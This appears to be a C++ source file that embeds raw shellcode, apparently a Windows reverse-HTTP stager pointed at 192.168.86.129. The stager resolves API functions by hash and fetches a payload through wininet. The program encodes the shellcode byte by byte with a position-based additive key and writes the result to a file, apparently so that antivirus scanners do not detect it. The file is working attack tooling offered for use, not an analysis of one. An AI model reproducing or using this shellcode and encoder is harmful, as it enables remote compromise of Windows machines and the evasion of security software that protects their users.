﻿#include <iostream>
#include <windows.h>

BYTE load[] = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x51\x00\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x4c\x4a\x79\x4d\x00\x41\xf5\x92\xc3\xd5\x12\x64\x4c\xe1\xca\x43\xbd\x91\xf0\xed\x85\xe1\x13\x85\x37\xbf\x9a\xf3\xc2\x78\xd4\x0b\x2a\x8f\x8c\x7b\xb1\x28\x0f\xd3\x3f\x9e\x75\x11\xaa\x95\x32\xae\xf6\x07\xfb\x7a\x38\x77\x3a\x28\x67\xfa\x4a\x15\xb2\xcb\xb7\xa7\x07\x6b\xaf\xac\x77\xae\x16\x1f\xd5\xdf\xd2\xd7\xde\x8a\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x4c\x45\x4e\x32\x29\x0d\x0a\x00\xa6\x9b\x96\xb2\xa7\x07\x26\x39\x1b\xfe\x72\x51\x67\x15\x95\x54\xd7\x63\x1e\xfb\xbd\x71\x51\x19\x57\xc6\xe4\x7c\xfc\x9a\x0c\xa6\xee\x39\x51\x73\x5e\x0c\x65\x2b\xad\x3f\xa8\xe6\x7d\xf9\x10\x60\x73\x12\xe6\xc8\x48\x56\x4c\xd8\x10\x5b\x02\x79\x66\x53\x7d\xce\xe5\x5d\xe3\xe1\x42\x7e\x89\xd0\x8f\x54\x52\xc4\xf2\xf4\x24\x40\x4a\xa2\xa1\xf6\xdc\x42\x18\x97\x60\x25\x83\x13\x40\xf1\x0b\xf6\xc0\x86\x48\xb3\xb8\xaf\xc5\x58\x2a\x73\xf3\x87\xd5\x6a\xf2\xcf\xb0\x9b\xaa\x0b\x2b\xd0\xdc\x73\x34\x98\xdc\x3c\x78\xe8\x19\xf0\x27\x1d\x76\x92\xa1\xf3\xbe\x91\xa1\x27\xa9\x8a\xbf\xd4\xbb\x15\x2b\x2a\xc4\x43\x52\x73\xe8\x8f\x23\x75\x7b\xba\x93\x9d\x24\x8a\xf5\xd1\x58\x48\x6d\x5a\xc5\x29\x6e\x30\x90\x6c\x42\x63\xea\xbf\x8a\x65\xcd\xef\x16\x84\x16\x96\xbe\x3f\x81\xcd\x15\x80\x84\x34\x57\x0c\xc6\x1f\x10\x6d\xf5\x37\x6b\xd5\xdb\x24\xd8\x69\x93\x58\x99\xc7\xa0\x2f\x2c\xf9\xa9\xb3\xf7\xa8\x3f\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x38\x36\x2e\x31\x32\x39\x00\x19\x69\xa0\x8d";

BYTE Encrpy(BYTE var1, int var2) {
	BYTE code = var1 % 256;
	BYTE key = var2 % 256;
	BYTE shellcode = code + key;
	if (shellcode > 256) {
		shellcode = shellcode - 256;
	}
	return shellcode;
}



void Encrpyall() {
	for (int key = 1; key < sizeof(load); key++) {
		load[key - 1] = Encrpy(load[key - 1], key);
	}
}
int main()
{
	Encrpyall();
	//保存新的加密文件
	HANDLE hEncryptFile = CreateFileA("C:\\Users\\GalaXY\\ii.txt", GENERIC_ALL, 0, NULL, CREATE_NEW, 0, NULL);
	if (hEncryptFile == INVALID_HANDLE_VALUE)
	{
		printf("Error");
		return -1;
	}

	DWORD dwWriteEncryptData = 0;
	//WriteFile(hEncryptFile, lpEncryptAddress, 800,&dwWriteEncryptData,NULL);
	WriteFile(hEncryptFile, load, sizeof(load), &dwWriteEncryptData, NULL);

	return 0;
}



